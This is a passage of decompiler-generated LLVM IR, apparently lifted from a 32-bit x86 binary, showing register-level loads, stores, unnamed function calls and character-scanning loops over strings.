  store i1 %v9_8049da3, i1* %zf.global-to-local, align 1
  %v0_8049da6 = load i32, i32* @edi, align 4
  %v2_8049da6 = add i32 %v0_80496b5, -16
  %v3_8049da6 = inttoptr i32 %v2_8049da6 to i32*
  store i32 %v0_8049da6, i32* %v3_8049da6, align 4
  %v2_8049da7 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049da7, i32* %eax.global-to-local, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v1_8049dac = add i32 %v0_8049dac, 16
  %v1_8049daf = add i32 %v2_8049da7, -127
  %v6_8049daf = sub i32 126, %v2_8049da7
  %v7_8049daf = and i32 %v6_8049daf, %v2_8049da7
  %v8_8049daf = icmp slt i32 %v7_8049daf, 0
  %v9_8049daf = icmp eq i32 %v1_8049daf, 0
  store i1 %v9_8049daf, i1* %zf.global-to-local, align 1
  %v10_8049daf = icmp slt i32 %v1_8049daf, 0
  %v3_8049db2 = icmp eq i1 %v10_8049daf, %v8_8049daf
  %v4_8049db2 = icmp eq i1 %v9_8049daf, false
  %v5_8049db2 = and i1 %v4_8049db2, %v3_8049db2
  br i1 %v5_8049db2, label %dec_label_pc_80496c3, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049da3
  %v2_8049db8 = add i32 %v0_8049dac, 12
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db8, align 4
  %v2_8049db9 = add i32 %v0_8049dac, 8
  %v3_8049db9 = inttoptr i32 %v2_8049db9 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db9, align 4
  %v0_8049dba = load i32, i32* @edi, align 4
  %v2_8049dba = add i32 %v0_8049dac, 4
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 %v0_8049dba, i32* %v3_8049dba, align 4
  %v1_8049dbb = add i32 %v0_8049dac, 108
  %v2_8049dbb = inttoptr i32 %v1_8049dbb to i32*
  %v3_8049dbb = load i32, i32* %v2_8049dbb, align 4
  store i32 %v3_8049dbb, i32* %edx.global-to-local, align 4
  %v1_8049dbf = add i32 %v3_8049dbb, 16
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  %v3_8049dbf = load i32, i32* %v2_8049dbf, align 4
  %v2_8049dc2 = mul i32 %v3_8049dbf, 128
  %v3_8049dc2 = icmp eq i32 %v2_8049dc2, 0
  store i1 %v3_8049dc2, i1* %zf.global-to-local, align 1
  %v0_8049dc5 = load i32, i32* @ebp, align 4
  %v2_8049dc5 = add i32 %v0_8049dc5, %v2_8049dc2
  store i32 %v2_8049dc5, i32* %eax.global-to-local, align 4
  %v3_8049dc9 = inttoptr i32 %v0_8049dac to i32*
  store i32 %v2_8049dc5, i32* %v3_8049dc9, align 4
  %v3_8049dca = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049dca, i32* %eax.global-to-local, align 4
  %v0_8049dcf = load i32, i32* @esp, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, 108
  %v2_8049dcf = inttoptr i32 %v1_8049dcf to i32*
  %v3_8049dcf = load i32, i32* %v2_8049dcf, align 4
  store i32 %v3_8049dcf, i32* %ecx.global-to-local, align 4
  %v1_8049dd3 = add i32 %v3_8049dcf, 16
  %v2_8049dd3 = inttoptr i32 %v1_8049dd3 to i32*
  %v3_8049dd3 = load i32, i32* %v2_8049dd3, align 4
  %v2_8049dd6 = mul i32 %v3_8049dd3, 128
  %v3_8049dd6 = icmp eq i32 %v2_8049dd6, 0
  store i1 %v3_8049dd6, i1* %zf.global-to-local, align 1
  %v0_8049dd9 = load i32, i32* @ebp, align 4
  %v2_8049dd9 = add i32 %v0_8049dd9, %v2_8049dd6
  store i32 %v2_8049dd9, i32* %ebx.global-to-local, align 4
  %v2_8049ddd = inttoptr i32 %v0_8049dcf to i32*
  store i32 %v2_8049dd9, i32* %v2_8049ddd, align 4
  %v2_8049de0 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049de0, i32* %eax.global-to-local, align 4
  %v0_8049de5 = load i32, i32* @esp, align 4
  %v1_8049de5 = inttoptr i32 %v0_8049de5 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  store i32 %v2_8049de5, i32* %ecx.global-to-local, align 4
  %v3_8049de5 = add i32 %v0_8049de5, 4
  %v0_8049de6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049de6 = add i32 %v0_8049de6, %v2_8049de0
  %v12_8049de6 = icmp eq i32 %v2_8049de6, 0
  store i1 %v12_8049de6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049de6, i32* @ebx, align 4
  %v1_8049de8 = inttoptr i32 %v3_8049de5 to i32*
  store i32 ptrtoint (i32* @global_var_8054b73.19 to i32), i32* %v1_8049de8, align 4
  %v0_8049dee = load i32, i32* @ebx, align 4
  store i32 %v0_8049dee, i32* %v1_8049de5, align 4
  %v3_8049def = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049def, i32* %eax.global-to-local, align 4
  %v0_8049df4 = load i32, i32* @esp, align 4
  %v1_8049df4 = add i32 %v0_8049df4, 56
  %v2_8049df4 = inttoptr i32 %v1_8049df4 to i32*
  %v3_8049df4 = load i32, i32* %v2_8049df4, align 4
  store i32 %v3_8049df4, i32* %ebx.global-to-local, align 4
  %v1_8049df8 = add i32 %v0_8049df4, -4
  %v2_8049df8 = inttoptr i32 %v1_8049df8 to i32*
  store i32 1, i32* %v2_8049df8, align 4
  %v1_8049dfa = add i32 %v0_8049df4, -8
  %v2_8049dfa = inttoptr i32 %v1_8049dfa to i32*
  store i32 ptrtoint (i32* @global_var_8054b7a.16 to i32), i32* %v2_8049dfa, align 4
  %v1_8049dff = add i32 %v0_8049df4, 108
  %v2_8049dff = inttoptr i32 %v1_8049dff to i32*
  %v3_8049dff = load i32, i32* %v2_8049dff, align 4
  store i32 %v3_8049dff, i32* %edx.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e03 = add i32 %v0_8049e03, 3
  store i32 %v1_8049e03, i32* @ebx, align 4
  %v0_8049e06 = load i32, i32* @esi, align 4
  %v2_8049e06 = add i32 %v0_8049e06, %v1_8049e03
  store i32 %v2_8049e06, i32* @esi, align 4
  %v1_8049e08 = add i32 %v3_8049dff, 660
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0e = sub i32 %v3_8049e08, %v1_8049e03
  %v12_8049e0e = icmp eq i32 %v2_8049e0e, 0
  store i1 %v12_8049e0e, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e0e, i32* %eax.global-to-local, align 4
  %v2_8049e10 = add i32 %v0_8049df4, -12
  %v3_8049e10 = inttoptr i32 %v2_8049e10 to i32*
  store i32 %v2_8049e0e, i32* %v3_8049e10, align 4
  %v0_8049e11 = load i32, i32* @esi, align 4
  %v2_8049e11 = add i32 %v0_8049df4, -16
  %v3_8049e11 = inttoptr i32 %v2_8049e11 to i32*
  store i32 %v0_8049e11, i32* %v3_8049e11, align 4
  %v0_8049e12 = call i32 @function_8051d50()
  store i32 %v0_8049e12, i32* %eax.global-to-local, align 4
  %v0_8049e17 = load i32, i32* @esp, align 4
  %v1_8049e17 = add i32 %v0_8049e17, 108
  %v2_8049e17 = inttoptr i32 %v1_8049e17 to i32*
  %v3_8049e17 = load i32, i32* %v2_8049e17, align 4
  store i32 %v3_8049e17, i32* %edx.global-to-local, align 4
  %v0_8049e1b = load i32, i32* @ebx, align 4
  %v2_8049e1b = add i32 %v0_8049e1b, %v3_8049e17
  store i32 %v2_8049e1b, i32* %ebx.global-to-local, align 4
  %v2_8049e1d = add i32 %v0_8049e12, 2115
  %v3_8049e1d = add i32 %v2_8049e1d, %v2_8049e1b
  %v4_8049e1d = inttoptr i32 %v3_8049e1d to i8*
  store i8 0, i8* %v4_8049e1d, align 1
  %v0_8049e25 = load i32, i32* @esp, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 124
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  %v3_8049e25 = load i32, i32* %v2_8049e25, align 4
  store i32 %v3_8049e25, i32* %ecx.global-to-local, align 4
  %v1_8049e2c = add i32 %v3_8049e25, 16
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  %v3_8049e2c = load i32, i32* %v2_8049e2c, align 4
  %v2_8049e2f = mul i32 %v3_8049e2c, 128
  %v3_8049e2f = icmp eq i32 %v2_8049e2f, 0
  store i1 %v3_8049e2f, i1* %zf.global-to-local, align 1
  %v0_8049e32 = load i32, i32* @ebp, align 4
  %v2_8049e32 = add i32 %v0_8049e32, %v2_8049e2f
  store i32 %v2_8049e32, i32* %ebx.global-to-local, align 4
  %v2_8049e36 = add i32 %v0_8049e25, 16
  %v3_8049e36 = inttoptr i32 %v2_8049e36 to i32*
  store i32 %v2_8049e32, i32* %v3_8049e36, align 4
  %v2_8049e37 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049e37, i32* %eax.global-to-local, align 4
  %v0_8049e3c = load i32, i32* @esp, align 4
  %v1_8049e3c = inttoptr i32 %v0_8049e3c to i32*
  %v2_8049e3c = load i32, i32* %v1_8049e3c, align 4
  store i32 %v2_8049e3c, i32* %ecx.global-to-local, align 4
  %v3_8049e3c = add i32 %v0_8049e3c, 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049e3d = add i32 %v0_8049e3d, %v2_8049e37
  %v12_8049e3d = icmp eq i32 %v2_8049e3d, 0
  store i1 %v12_8049e3d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = inttoptr i32 %v3_8049e3c to i32*
  %v2_8049e3f = load i32, i32* %v1_8049e3f, align 4
  store i32 %v2_8049e3f, i32* @edi, align 4
  %v0_8049e40 = load i32, i32* @esi, align 4
  store i32 %v0_8049e40, i32* %v1_8049e3f, align 4
  %v0_8049e41 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e41, i32* %v1_8049e3c, align 4
  %v3_8049e42 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049e42, i32* %eax.global-to-local, align 4
  %v0_8049e47 = load i32, i32* @esp, align 4
  %v1_8049e47 = add i32 %v0_8049e47, 108
  %v2_8049e47 = inttoptr i32 %v1_8049e47 to i32*
  %v3_8049e47 = load i32, i32* %v2_8049e47, align 4
  store i32 %v3_8049e47, i32* %eax.global-to-local, align 4
  %v1_8049e4b = add i32 %v3_8049e47, 16
  %v2_8049e4b = inttoptr i32 %v1_8049e4b to i32*
  %v3_8049e4b = load i32, i32* %v2_8049e4b, align 4
  %v1_8049e51 = add i32 %v3_8049e4b, 1
  %v8_8049e51 = icmp eq i32 %v1_8049e51, 0
  store i1 %v8_8049e51, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e51, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e51, i32* %v2_8049e4b, align 4
  %v0_80496c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80496c3

dec_label_pc_8049e5a:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %eax.global-to-local, align 4
  %v1_8049e5e = add i32 %v3_8049e5a, -1448
  %v2_8049e5e = inttoptr i32 %v1_8049e5e to i8*
  store i8 1, i8* %v2_8049e5e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049a11
  %v1_8049e6a = add i32 %v0_8049a34, 20916
  %v2_8049e6a = inttoptr i32 %v1_8049e6a to i32*
  store i32 7, i32* %v2_8049e6a, align 4
  %v0_8049e75 = load i32, i32* @ebx, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 4
  %v2_8049e75 = inttoptr i32 %v1_8049e75 to i8*
  %v3_8049e75 = load i8, i8* %v2_8049e75, align 1
  %v12_8049e75 = icmp eq i8 %v3_8049e75, 115
  store i1 %v12_8049e75, i1* %zf.global-to-local, align 1
  %v1_8049e79 = icmp eq i1 %v12_8049e75, false
  br i1 %v1_8049e79, label %dec_label_pc_8049e86, label %dec_label_pc_8049e7b

dec_label_pc_8049e7b:                             ; preds = %dec_label_pc_8049e6a
  %v0_8049e7b = load i32, i32* @esp, align 4
  %v1_8049e7b = add i32 %v0_8049e7b, 20900
  %v2_8049e7b = inttoptr i32 %v1_8049e7b to i32*
  store i32 8, i32* %v2_8049e7b, align 4
  br label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e7b
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v1_8049e86 = add i32 %v0_8049e86, 20900
  %v2_8049e86 = inttoptr i32 %v1_8049e86 to i32*
  %v3_8049e86 = load i32, i32* %v2_8049e86, align 4
  store i32 %v3_8049e86, i32* %edx.global-to-local, align 4
  %v2_8049e8d = add i32 %v0_8049e86, -4
  %v3_8049e8d = inttoptr i32 %v2_8049e8d to i32*
  store i32 4, i32* %v3_8049e8d, align 4
  %v0_8049e8e = load i32, i32* @edi, align 4
  %v1_8049e8e = add i32 %v0_8049e8e, 1
  %v1_8049e91 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e91 = sub i32 %v1_8049e8e, %v1_8049e91
  %v12_8049e91 = icmp eq i32 %v2_8049e91, 0
  store i1 %v12_8049e91, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  %v0_8049e93 = load i32, i32* @ebx, align 4
  %v2_8049e93 = add i32 %v0_8049e93, %v1_8049e91
  store i32 %v2_8049e93, i32* %edx.global-to-local, align 4
  %v2_8049e96 = add i32 %v0_8049e86, -8
  %v3_8049e96 = inttoptr i32 %v2_8049e96 to i32*
  store i32 %v2_8049e91, i32* %v3_8049e96, align 4
  %v0_8049e97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e97 = add i32 %v0_8049e86, -12
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e97, i32* %v3_8049e97, align 4
  %v0_8049e98 = load i32, i32* @ebx, align 4
  %v2_8049e98 = add i32 %v0_8049e86, -16
  %v3_8049e98 = inttoptr i32 %v2_8049e98 to i32*
  store i32 %v0_8049e98, i32* %v3_8049e98, align 4
  %v4_8049e99 = call i32 @function_80527a3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e99, i32* %eax.global-to-local, align 4
  %v0_8049e9e = load i32, i32* @esp, align 4
  %v1_8049e9e = add i32 %v0_8049e9e, 20916
  %v2_8049e9e = inttoptr i32 %v1_8049e9e to i32*
  store i32 0, i32* %v2_8049e9e, align 4
  %v0_8049ea9 = load i32, i32* @esp, align 4
  %v6_8049ea9 = icmp eq i32 %v0_8049ea9, -16
  store i1 %v6_8049ea9, i1* %zf.global-to-local, align 1
  %v0_8049eac = load i32, i32* @ebx, align 4
  %v1_8049eac = inttoptr i32 %v0_8049eac to i8*
  %v2_8049eac = load i8, i8* %v1_8049eac, align 1
  %v3_8049eac = zext i8 %v2_8049eac to i32
  %v5_8049eac = and i32 %v4_8049e99, -256
  %v6_8049eac = or i32 %v3_8049eac, %v5_8049eac
  store i32 %v6_8049eac, i32* %eax.global-to-local, align 4
  %v4_8049eae = icmp eq i8 %v2_8049eac, 0
  store i1 %v4_8049eae, i1* %zf.global-to-local, align 1
  br i1 %v4_8049eae, label %dec_label_pc_8049ce8, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e86
  store i32 %v0_8049eac, i32* %ecx.global-to-local, align 4
  %v10_8049eb8 = icmp eq i8 %v2_8049eac, 47
  store i1 %v10_8049eb8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049eb8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb6
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049ed1195 = add i32 %v0_8049eac, 1
  store i32 %v2_8049ed1195, i32* %ecx.global-to-local, align 4
  %v2_8049ed4196 = add i32 %v0_8049ea9, 20916
  %v3_8049ed4197 = inttoptr i32 %v2_8049ed4196 to i32*
  store i32 1, i32* %v3_8049ed4197, align 4
  %v0_8049edb198 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb199 = inttoptr i32 %v0_8049edb198 to i8*
  %v2_8049edb200 = load i8, i8* %v1_8049edb199, align 1
  %v3_8049edb201 = zext i8 %v2_8049edb200 to i32
  %v4_8049edb202 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb203 = and i32 %v4_8049edb202, -256
  %v6_8049edb204 = or i32 %v5_8049edb203, %v3_8049edb201
  store i32 %v6_8049edb204, i32* %edx.global-to-local, align 4
  %v4_8049edd205 = icmp eq i8 %v2_8049edb200, 0
  store i1 %v4_8049edd205, i1* %zf.global-to-local, align 1
  %v1_8049edf206 = icmp eq i1 %v4_8049edd205, false
  br i1 %v1_8049edf206, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ec7:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge
  %v2_8049edb208 = phi i8 [ %v2_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v2_8049edb200, %dec_label_pc_8049ec0 ]
  %v0_8049edb207 = phi i32 [ %v0_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v0_8049edb198, %dec_label_pc_8049ec0 ]
  %v0_8049ec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ec7 = add i32 %v0_8049ec7, 1
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v10_8049ec8 = icmp eq i8 %v2_8049edb208, 47
  store i1 %v10_8049ec8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ec8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge

dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge: ; preds = %dec_label_pc_8049ec7
  %v0_8049ed1.pre = load i32, i32* @ebx, align 4
  %v1_8049ed4.pre = load i32, i32* @esp, align 4
  %v2_8049ed1 = add i32 %v0_8049ed1.pre, %v1_8049ec7
  store i32 %v2_8049ed1, i32* %ecx.global-to-local, align 4
  %v2_8049ed4 = add i32 %v1_8049ed4.pre, 20900
  %v3_8049ed4 = inttoptr i32 %v2_8049ed4 to i32*
  store i32 %v1_8049ec7, i32* %v3_8049ed4, align 4
  %v0_8049edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb = inttoptr i32 %v0_8049edb to i8*
  %v2_8049edb = load i8, i8* %v1_8049edb, align 1
  %v3_8049edb = zext i8 %v2_8049edb to i32
  %v4_8049edb = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb = and i32 %v4_8049edb, -256
  %v6_8049edb = or i32 %v5_8049edb, %v3_8049edb
  store i32 %v6_8049edb, i32* %edx.global-to-local, align 4
  %v4_8049edd = icmp eq i8 %v2_8049edb, 0
  store i1 %v4_8049edd, i1* %zf.global-to-local, align 1
  %v1_8049edf = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049edf, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ee6:                             ; preds = %dec_label_pc_8049930
  %v0_8049ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ee6 = add i32 %v0_8049ee6, 2
  store i32 %v1_8049ee6, i32* %eax.global-to-local, align 4
  %v1_8049ee9 = load i32, i32* @esp, align 4
  %v2_8049ee9 = add i32 %v1_8049ee9, 20900
  %v3_8049ee9 = inttoptr i32 %v2_8049ee9 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ee9, align 4
  %v0_8049951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804994e

dec_label_pc_8049ef5:                             ; preds = %dec_label_pc_80499c3
  %v1_8049ef5 = add i32 %v3_80499c3, 1
  store i32 %v1_8049ef5, i32* %ebx.global-to-local, align 4
  store i32 %v1_8049ef5, i32* %v2_80499c3, align 4
  %v0_8049eff = load i32, i32* @esp, align 4
  %v9_8049eff = icmp eq i32 %v0_8049eff, 12
  store i1 %v9_8049eff, i1* %zf.global-to-local, align 1
  %v0_8049f02 = load i32, i32* @esi, align 4
  %v1_8049f02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049f02 = add i32 %v1_8049f02, %v0_8049f02
  store i32 %v2_8049f02, i32* @ebx, align 4
  %v2_8049f05 = add i32 %v0_8049eff, -16
  %v3_8049f05 = inttoptr i32 %v2_8049f05 to i32*
  store i32 %v2_8049f02, i32* %v3_8049f05, align 4
  %v2_8049f06 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049f06, i32* %eax.global-to-local, align 4
  %v0_8049f0b = load i32, i32* @esp, align 4
  %v1_8049f0b = add i32 %v0_8049f0b, 16
  %v6_8049f0b = icmp eq i32 %v1_8049f0b, 0
  store i1 %v6_8049f0b, i1* %zf.global-to-local, align 1
  %v0_8049f0e = load i32, i32* @ebx, align 4
  %v2_8049f0e = add i32 %v2_8049f06, -1
  %v3_8049f0e = add i32 %v2_8049f0e, %v0_8049f0e
  %v4_8049f0e = inttoptr i32 %v3_8049f0e to i8*
  %v5_8049f0e = load i8, i8* %v4_8049f0e, align 1
  %v14_8049f0e = icmp eq i8 %v5_8049f0e, 34
  store i1 %v14_8049f0e, i1* %zf.global-to-local, align 1
  %v1_8049f13 = icmp eq i1 %v14_8049f0e, false
  br i1 %v1_8049f13, label %dec_label_pc_80499d4, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ef5
  %v1_8049f19 = add i32 %v0_8049f0b, 20916
  %v2_8049f19 = inttoptr i32 %v1_8049f19 to i32*
  %v3_8049f19 = load i32, i32* %v2_8049f19, align 4
  store i32 %v3_8049f19, i32* %eax.global-to-local, align 4
  %v0_8049f20 = load i32, i32* @esi, align 4
  %v2_8049f25 = add i32 %v0_8049f20, %v3_8049f19
  %v12_8049f25 = icmp eq i32 %v2_8049f25, 0
  store i1 %v12_8049f25, i1* %zf.global-to-local, align 1
  store i32 %v2_8049f25, i32* @ebx, align 4
  %v3_8049f27 = inttoptr i32 %v0_8049f0b to i32*
  store i32 %v2_8049f25, i32* %v3_8049f27, align 4
  %v2_8049f28 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8049f28, i32* %eax.global-to-local, align 4
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v6_8049f2d = icmp eq i32 %v0_8049f2d, -16
  store i1 %v6_8049f2d, i1* %zf.global-to-local, align 1
  %v0_8049f30 = load i32, i32* @ebx, align 4
  %v2_8049f30 = add i32 %v2_8049f28, -1
  %v3_8049f30 = add i32 %v2_8049f30, %v0_8049f30
  %v4_8049f30 = inttoptr i32 %v3_8049f30 to i8*
  store i8 0, i8* %v4_8049f30, align 1
  %v0_80499d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80499d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_804848a
  %v9_8049f3a = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049f3a, i1* %zf.global-to-local, align 1
  %v1_8049f3d = add i32 %v0_80484a0, -16
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 47, i32* %v2_8049f3d, align 4
  %v2_8049f3f = call i32 @function_8051350(i8 %v1_8049f3f)
  store i32 %v2_8049f3f, i32* %eax.global-to-local, align 4
  %v0_8049f44 = load i32, i32* @esp, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* @ebx, align 4
  %v3_8049f44 = add i32 %v0_8049f44, 4
  %v1_8049f45 = inttoptr i32 %v3_8049f44 to i32*
  store i32 0, i32* %v1_8049f45, align 4
  store i32 47, i32* %v1_8049f44, align 4
  %v3_8049f4a = call i32 @function_80512a0(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049f4a, i32* %eax.global-to-local, align 4
  %v0_8049f4f = load i32, i32* @esp, align 4
  %v1_8049f4f = inttoptr i32 %v0_8049f4f to i32*
  %v2_8049f4f = load i32, i32* %v1_8049f4f, align 4
  store i32 %v2_8049f4f, i32* %edx.global-to-local, align 4
  %v3_8049f4f = add i32 %v0_8049f4f, 4
  %v1_8049f50 = inttoptr i32 %v3_8049f4f to i32*
  %v2_8049f50 = load i32, i32* %v1_8049f50, align 4
  store i32 %v2_8049f50, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049f4a, i32* %v1_8049f50, align 4
  %v0_8049f52 = load i32, i32* @esi, align 4
  %v1_8049f52 = add i32 %v0_8049f52, 20
  store i32 %v1_8049f52, i32* %eax.global-to-local, align 4
  store i32 %v1_8049f52, i32* %v1_8049f4f, align 4
  %v3_8049f56 = call i32 @function_8051cc0(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f56, i32* %eax.global-to-local, align 4
  %v0_8049f5b = load i32, i32* @esp, align 4
  %v1_8049f5b = inttoptr i32 %v0_8049f5b to i32*
  store i32 47, i32* %v1_8049f5b, align 4
  %v2_8049f62 = call i32 @function_80512d0(i8 %v1_8049f3f)
  store i32 %v2_8049f62, i32* %eax.global-to-local, align 4
  %v0_8049f67 = load i32, i32* @esp, align 4
  %v1_8049f67 = add i32 %v0_8049f67, 16
  %v6_8049f67 = icmp eq i32 %v1_8049f67, 0
  store i1 %v6_8049f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_804a062, %dec_label_pc_8049ff8, %dec_label_pc_8049fc3, %dec_label_pc_8049f3a
  %v1_8049f6a = phi i32 [ %v0_80484a0, %dec_label_pc_804848a ], [ %v1_804a08f, %dec_label_pc_804a062 ], [ %v1_804a025, %dec_label_pc_8049ff8 ], [ %v1_8049ff0, %dec_label_pc_8049fc3 ], [ %v1_8049f67, %dec_label_pc_8049f3a ]
  %v0_8049f6a = phi i32 [ %v2_80484ac, %dec_label_pc_804848a ], [ %v2_804a08a, %dec_label_pc_804a062 ], [ %v2_804a020, %dec_label_pc_8049ff8 ], [ %v2_8049feb, %dec_label_pc_8049fc3 ], [ %v2_8049f62, %dec_label_pc_8049f3a ]
  %v2_8049f6a = add i32 %v1_8049f6a, -4
  %v3_8049f6a = inttoptr i32 %v2_8049f6a to i32*
  store i32 %v0_8049f6a, i32* %v3_8049f6a, align 4
  %v0_8049f6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f6b = add i32 %v1_8049f6a, -8
  %v3_8049f6b = inttoptr i32 %v2_8049f6b to i32*
  store i32 %v0_8049f6b, i32* %v3_8049f6b, align 4
  %v1_8049f6c = add i32 %v1_8049f6a, 64
  %v2_8049f6c = inttoptr i32 %v1_8049f6c to i32*
  %v3_8049f6c = load i32, i32* %v2_8049f6c, align 4
  store i32 %v3_8049f6c, i32* %eax.global-to-local, align 4
  %v0_8049f70 = load i32, i32* @ebp, align 4
  %v1_8049f70 = add i32 %v0_8049f70, 1
  store i32 %v1_8049f70, i32* @ebp, align 4
  %v2_8049f71 = add i32 %v1_8049f6a, -12
  %v3_8049f71 = inttoptr i32 %v2_8049f71 to i32*
  store i32 %v3_8049f6c, i32* %v3_8049f71, align 4
  %v0_8049f72 = load i32, i32* @esi, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 3140
  %v9_8049f72 = icmp eq i32 %v1_8049f72, 0
  store i1 %v9_8049f72, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f72, i32* @esi, align 4
  %v1_8049f78 = add i32 %v1_8049f6a, 36
  %v2_8049f78 = inttoptr i32 %v1_8049f78 to i32*
  %v3_8049f78 = load i32, i32* %v2_8049f78, align 4
  store i32 %v3_8049f78, i32* @edi, align 4
  %v2_8049f7c = add i32 %v1_8049f6a, -16
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v3_8049f78, i32* %v3_8049f7c, align 4
  %v3_8049f7d = call i32 @function_8051cc0(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f7d, i32* %eax.global-to-local, align 4
  %v0_8049f82 = load i32, i32* @esp, align 4
  %v1_8049f85 = add i32 %v0_8049f82, 128
  %v2_8049f85 = inttoptr i32 %v1_8049f85 to i32*
  %v3_8049f85 = load i32, i32* %v2_8049f85, align 4
  %v4_8049f85 = load i32, i32* @ebp, align 4
  %v15_8049f85 = icmp eq i32 %v3_8049f85, %v4_8049f85
  store i1 %v15_8049f85, i1* %zf.global-to-local, align 1
  %v1_8049f89 = icmp eq i1 %v15_8049f85, false
  br i1 %v1_8049f89, label %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, label %dec_label_pc_8049f8f

dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge: ; preds = %dec_label_pc_8049f6a
  %v0_80483a9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80483a7

dec_label_pc_8049f8f:                             ; preds = %dec_label_pc_8049f6a
  %v1_8049f8f = add i32 %v0_8049f82, 20756
  store i32 %v1_8049f8f, i32* %edx.global-to-local, align 4
